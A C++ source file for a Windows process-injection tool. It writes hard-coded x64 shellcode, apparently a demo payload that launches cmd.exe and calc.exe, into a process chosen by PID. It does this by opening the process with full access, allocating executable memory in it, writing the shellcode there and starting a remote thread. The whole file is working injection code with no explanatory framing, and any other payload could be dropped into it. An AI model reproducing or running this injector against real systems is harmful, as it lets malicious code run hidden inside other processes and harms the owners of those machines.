#include <iostream>
#include <windows.h>

using namespace std;

const char *k = "[+]";
const char *n = "[-]";
const char *i = "[*]";

const char my_shell[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
                        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
                        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
                        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
                        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
                        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
                        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
                        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
                        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
                        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
                        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
                        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
                        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
                        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
                        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
                        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
                        "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
                        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
                        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
                        "\xd5\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x63\x61"
                        "\x6c\x63\x2e\x65\x78\x65\x00";
size_t shell_code_size = sizeof(my_shell);

int main(int argc, char *argv[])
{
    PVOID rBuffer = nullptr;
    DWORD Process_id = NULL, Thread_id = NULL;

    HANDLE hProcess = nullptr, hThread = nullptr;

    if (argc < 2)
    {
        cout << "Please provide a valid process id." << endl
             << "%s usage: %s <PID>" << n,
            argv[0];

        return EXIT_FAILURE;
    }
    Process_id = atoi(argv[1]);
    cout << i << "Attempting to get a handle on the process." << Process_id << endl;

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, Process_id);

    if (!hProcess)
    {
        cout << n << " Was not able to get a handle on the " << Process_id << " process" << endl;
        cout << i << "This was the following error." << GetLastError();
    }
    cout << k << "We got a handle." << hProcess << endl;

    rBuffer = rBuffer = VirtualAllocEx(hProcess, NULL, shell_code_size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    if (!rBuffer)
    {
        cout << n << "The buffer was not allocated. With the following error." << GetLastError();
    }
    cout << k << "The buffer was allocated with the following memory size in bytes: " << shell_code_size;

    bool memory_written = WriteProcessMemory(hProcess, rBuffer, my_shell, shell_code_size, NULL);
    if (!memory_written)
    {
        cout << n << "The shell code was not written in the allocated buffer." << endl;
    }
    cout << "The shell code was written in the allocated buffer.";

    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, &Thread_id);

    if (hThread == NULL)
    {
        cout << n << " failed to get a handle to the new thread, error: " << GetLastError() << endl;
        return EXIT_FAILURE;
    }

    cout << k << " got a handle to the newly-created thread (" << Thread_id << ")" << endl
         << "\\---0x" << hProcess << endl;

    cout << i << " waiting for thread to finish executing" << endl;
    WaitForSingleObject(hThread, INFINITE);
    cout << k << " thread finished executing, cleaning up" << endl;

    CloseHandle(hThread);
    CloseHandle(hProcess);
    cout << k << " finished, see you next time :>" << endl;

    return EXIT_SUCCESS;
}
